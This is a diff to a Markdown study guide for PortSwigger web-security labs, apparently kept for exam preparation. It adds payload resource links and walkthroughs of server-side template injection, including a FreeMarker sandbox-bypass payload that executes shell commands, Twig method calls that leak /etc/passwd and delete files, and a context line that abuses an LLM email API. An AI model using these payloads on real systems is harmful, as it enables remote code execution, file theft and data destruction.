@@ -9,6 +9,11 @@
    - [Burp Suite Certified Practitioner Exam Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#identified)
 1. [iNE - eWPT Web Application Penetration Tester](https://security.ine.com/certifications/ewpt-certification/)
 
+# Payload, github, hacker blogger
+- [HackTricks](https://book.hacktricks.xyz/)
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
+- [Seven Seas Security - Portswigger walkthrough](https://www.youtube.com/@7SeasSecurity)
+
 # Table of Contents
 **Server-side topics (13~113 labs)**
 - [SQL Injection](#sql-injection)
@@ -3226,8 +3231,52 @@ LLM -> API: create_email_forwarding_rule('peter')
 	{{/with}}
     ```
   - rm command to remove carlos file: `https://YOUR-LAB-ID.web-security-academy.net/?message=<URL Encode PAYLOAD>`
-- dd
-- dd
+- Server-side template injection with **information disclosure** via user-supplied objects
+  - Try invalid fuzz string `${{<%[%'"}}%\` > "Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py"
+  - Study the settings object in the **Django** documentation > `{{ settings.SECRET_KEY }}`
+- Server-side template injection in a **sandboxed** environment
+  - Tr invalid template string ${product.priceZZ}  > "FreeMarker template error (DEBUG mode; use RETHROW in production!)"
+  - Study the FreeMarker(Java) > Sandbox bypass
+    ```
+    <#assign classloader=article.class.protectionDomain.classLoader>
+    <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+    <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+    <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+    ${dwf.newInstance(ec,null)("id")}
+    ```
+  - Response： "The following has evaluated to null or missing: ==> article [in template "freemarker"
+  - change the "article" to "product" 
+    `<#assign classloader=product.class.protectionDomain.classLoader>`
+  - Read the my_password.txt from home directory
+    `${dwf.newInstance(ec,null)("cat my_password.txt ")}`
+  - Server-side template injection with a **custom exploit**
+    - Upload invalid object
+      ```
+      PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28
+	Stack trace:
+	#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/\xE9\x80\xA0\xE6\x88\x90\xE6\xB2\x9F\xE9...', 'text/plain')
+	#1 {main}
+	  thrown in /home/carlos/User.php on line 28
+      ```
+    - Test invalid input for SSTI
+      ```
+      POST /my-account/change-blog-post-author-display
+      blog-post-author-display=user.first_name&csrf=uPkrQsnIZwIM7d5Cqt81xOtbUQXls0Vi > blog-post-author-display=user
+ 
+      PHP Fatal error: Uncaught Error: Object of class User could not be converted to string in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php
+      ```
+    - Update the display name
+      blog-post-author-display=user.`setAvatar('/etc/passwd','image/png')` > Download the avatar img file > passwd leak
+    - Read the source code
+      ```
+       public function gdprDelete() {
+        $this->rm(readlink($this->avatarLink));
+        $this->rm($this->avatarLink);
+        $this->delete();
+      }
+      ```
+    - Delete the user's avatar
+      blog-post-author-display=`user.gdprDelete()`  
   
 ## Web Cache Poisoning
 Content for Web Cache Poisoning...
